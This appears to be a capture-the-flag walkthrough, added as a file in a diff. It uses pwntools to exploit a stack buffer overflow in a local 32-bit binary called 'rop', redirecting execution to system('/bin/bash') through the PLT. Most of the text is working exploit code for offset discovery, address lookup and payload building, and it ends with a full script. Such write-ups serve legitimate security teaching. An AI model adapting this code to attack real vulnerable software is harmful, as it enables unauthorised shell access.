@@ -1,0 +1,232 @@
+To solve this challenge using pwntools, we'll exploit a buffer overflow vulnerability in the `vulnerable_function()` to execute a shell by calling `system("/bin/bash")`. Here's a step-by-step guide along with the corresponding code.
+
+---
+
+### **Step 1: Analyze the Binary**
+
+From the information provided:
+
+- **Buffer Overflow Vulnerability:**
+  - The `vulnerable_function()` reads up to 256 bytes (`0x100u`) into a buffer of size 136 bytes (`char buf[136];`).
+  - This leads to a buffer overflow vulnerability because the function can read more data than the buffer can hold.
+
+- **Useful Functions and Strings:**
+  - The binary has the `system()` function available through the PLT.
+  - The string `/bin/bash` is present in the binary's data section.
+  - There's a function `not_called()` that executes `system("/bin/date")`, but we aim to get a shell instead.
+
+Our goal is to overwrite the return address on the stack to redirect execution to `system("/bin/bash")`.
+
+---
+
+### **Step 2: Find the Offset to Overwrite the Return Address**
+
+We'll use pwntools' cyclic patterns to determine the exact offset where the return address is overwritten.
+
+**Code:**
+
+```python
+from pwn import *
+
+# Create a cyclic pattern of 200 bytes
+pattern = cyclic(200)
+
+# Start the process
+p = process('./rop')
+
+# Send the pattern
+p.sendline(pattern)
+
+# Wait for the process to crash
+p.wait()
+
+# Open the core dump
+core = p.corefile
+
+# Find the value of EIP (instruction pointer) at the time of crash
+eip_value = core.eip
+log.info(f'EIP overwritten with: {hex(eip_value)}')
+
+# Find the offset where EIP (return address) is overwritten
+offset = cyclic_find(eip_value)
+log.info(f'Offset to EIP: {offset} bytes')
+
+# Clean up
+p.close()
+```
+
+**Explanation:**
+
+- **`cyclic(200)`:** Generates a 200-byte cyclic pattern that helps identify the offset.
+- **`p.corefile`:** Accesses the core dump created when the process crashes.
+- **`core.eip`:** Retrieves the value of the instruction pointer at the time of the crash.
+- **`cyclic_find(eip_value)`:** Calculates the offset at which the EIP was overwritten.
+
+---
+
+### **Step 3: Retrieve Necessary Addresses**
+
+We'll extract the addresses of the `system` function and the `/bin/bash` string from the binary.
+
+**Code:**
+
+```python
+# Load the ELF binary
+elf = ELF('./rop')
+
+# Retrieve the address of 'system' from the PLT
+system_addr = elf.plt['system']
+log.info(f"Address of system@plt: {hex(system_addr)}")
+
+# Find the address of the '/bin/bash' string
+bin_bash_addr = next(elf.search(b'/bin/bash'))
+log.info(f"Address of '/bin/bash' string: {hex(bin_bash_addr)}")
+```
+
+**Explanation:**
+
+- **`elf.plt['system']`:** Gets the address of the `system` function from the Procedure Linkage Table.
+- **`elf.search(b'/bin/bash')`:** Searches the binary's data for the `/bin/bash` string and retrieves its address.
+
+---
+
+### **Step 4: Build the Exploit Payload**
+
+Construct the payload to overwrite the return address and execute `system("/bin/bash")`.
+
+**Code:**
+
+```python
+# Create the payload
+payload = b'A' * offset                    # Pad up to the return address
+payload += p32(system_addr)                # Overwrite return address with system@plt
+payload += p32(0x0)                        # Return address after system (can be dummy)
+payload += p32(bin_bash_addr)              # Address of '/bin/bash' string (argument to system)
+```
+
+**Explanation:**
+
+- **`b'A' * offset`:** Fills the buffer up to the point where the return address is located.
+- **`p32(system_addr)`:** Overwrites the return address with the address of `system`.
+- **`p32(0x0)`:** Placeholder for the return address after `system` executes (not critical here).
+- **`p32(bin_bash_addr)`:** Places the address of `/bin/bash` on the stack as the argument to `system`.
+
+---
+
+### **Step 5: Execute the Exploit and Get a Shell**
+
+Send the payload to the binary and interact with the spawned shell.
+
+**Code:**
+
+```python
+# Start the process again
+p = process('./rop')
+
+# Send the exploit payload
+p.sendline(payload)
+
+# Interact with the shell
+p.interactive()
+```
+
+**Explanation:**
+
+- **`p.interactive()`:** Allows us to interact with the shell spawned by the exploit.
+
+---
+
+### **Full Exploit Script**
+
+Here's the complete script combining all the steps:
+
+```python
+from pwn import *
+
+# Set the architecture
+context.arch = 'i386'
+context.os = 'linux'
+
+# Load the ELF binary
+elf = ELF('./rop')
+
+# Step 1: Find the offset
+pattern = cyclic(200)
+p = process('./rop')
+p.sendline(pattern)
+p.wait()
+core = p.corefile
+eip_value = core.eip
+log.info(f'EIP overwritten with: {hex(eip_value)}')
+offset = cyclic_find(eip_value)
+log.info(f'Offset to EIP: {offset} bytes')
+p.close()
+
+# Step 2: Get required addresses
+system_addr = elf.plt['system']
+log.info(f"Address of system@plt: {hex(system_addr)}")
+bin_bash_addr = next(elf.search(b'/bin/bash'))
+log.info(f"Address of '/bin/bash' string: {hex(bin_bash_addr)}")
+
+# Step 3: Build the payload
+payload = b'A' * offset
+payload += p32(system_addr)
+payload += p32(0x0)  # Return address after system
+payload += p32(bin_bash_addr)
+
+# Step 4: Exploit
+p = process('./rop')
+p.sendline(payload)
+p.interactive()
+```
+
+---
+
+### **Explanation of the Full Script**
+
+- **Initialization:**
+  - We import pwntools and set the context to match the binary's architecture.
+  
+- **Finding the Offset (Step 1):**
+  - We send a cyclic pattern to cause a crash and find the offset to EIP.
+
+- **Retrieving Addresses (Step 2):**
+  - We extract the addresses of `system@plt` and the `/bin/bash` string.
+
+- **Building the Payload (Step 3):**
+  - We construct the payload to overflow the buffer and overwrite the return address.
+
+- **Executing the Exploit (Step 4):**
+  - We send the payload to the binary and interact with the resulting shell.
+
+---
+
+### **Additional Notes**
+
+- **Running the Exploit:**
+  - Ensure that the `rop` binary has execute permissions: `chmod +x rop`.
+  - Run the script in an environment where it's safe and legal to do so (e.g., within the context of a CTF competition or with explicit permission).
+
+- **Understanding the Exploit:**
+  - The buffer overflow allows us to overwrite the return address with a function of our choosing.
+  - By placing the address of `/bin/bash` after the `system` address, we effectively call `system("/bin/bash")`.
+
+- **Further Exploration:**
+  - You can modify the payload to execute different commands by changing the string used.
+  - Analyze the binary with tools like Ghidra or GDB for deeper understanding.
+
+---
+
+### **Safety and Ethics**
+
+- **Ethical Hacking:**
+  - This exploit is intended for educational purposes and should only be used in controlled environments.
+  - Always ensure you have permission before testing exploits on any system.
+
+- **Security Best Practices:**
+  - Buffer overflow vulnerabilities can be mitigated with proper bounds checking and modern compiler protections.
+  - Always write secure code and keep software up-to-date to prevent such vulnerabilities.
+
+---
+
+By following these steps and understanding the code, you should be able to successfully exploit the provided binary using pwntools.
